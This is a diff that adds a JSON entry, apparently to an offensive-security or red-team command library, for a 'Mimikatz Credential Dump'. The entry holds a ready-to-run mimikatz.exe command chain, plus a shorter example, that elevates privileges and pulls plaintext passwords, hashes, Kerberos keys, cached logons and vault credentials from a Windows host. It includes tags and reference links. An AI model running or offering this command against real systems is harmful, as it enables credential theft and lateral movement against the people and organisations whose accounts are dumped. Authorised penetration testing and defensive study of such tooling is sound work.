@@ -1,0 +1,35 @@
+{
+  "id": "mimikatz-dump",
+  "name": "Mimikatz Credential Dump",
+  "command": "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::lsa /inject' 'lsadump::sam' 'lsadump::cache' 'sekurlsa::ekeys' 'vault::cred' 'exit'",
+  "description": "Extract plaintext passwords and hashes from all available sources",
+  "platform": "windows",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [],
+  "tags": [
+    "mimikatz",
+    "passwords",
+    "hashes",
+    "lsass",
+    "sam"
+  ],
+  "references": [
+    {
+      "title": "Mimikatz GitHub",
+      "url": "https://github.com/gentilkiwi/mimikatz"
+    },
+    {
+      "title": "HackTricks - Mimikatz",
+      "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/mimikatz"
+    },
+    {
+      "title": "Mimikatz Command Reference",
+      "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md"
+    }
+  ],
+  "examples": [
+    "./mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'exit'"
+  ]
+}
